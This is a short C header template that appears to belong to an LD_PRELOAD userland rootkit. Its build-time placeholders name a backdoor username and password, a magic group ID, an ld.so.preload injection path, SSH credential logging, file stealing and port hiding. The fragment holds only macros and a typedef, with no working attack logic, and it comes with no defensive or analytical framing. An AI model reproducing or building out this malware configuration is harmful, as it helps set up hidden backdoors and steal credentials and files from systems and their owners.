/*
*   DON'T TOUCH ANYTHING IN THIS FILE.
*/

#define BD_UNAME "??BD_UNAME??"
#define BD_PWD "??BD_PWD??"
#define MAGIC_GID ??MAGIC_GID??
#define BD_VAR "??BD_VAR??"
#define INSTALL_DIR "??INSTALL_DIR??"
#define BDVLSO "??BDVLSO??"
#define SOPATH "??SOPATH??"
#define LDSO_PRELOAD "??LDSO_PRELOAD??"

#ifdef LOG_SSH
#define SSH_LOGS "??SSH_LOGS??" // [LOG_SSH]
#endif
#ifdef FILE_STEAL
#define INTEREST_DIR "??INTEREST_DIR??" // [FILE_STEAL]
#endif
#ifdef HIDE_PORTS
#define HIDEPORTS "??HIDEPORTS??" // [HIDE_PORTS]
#endif

//#define PATH_MAX 4096
#define LINE_MAX 2048

typedef struct {
    void *(*func)();
} syms;

#define sizeofarr(arr) sizeof(arr) / sizeof(arr[0])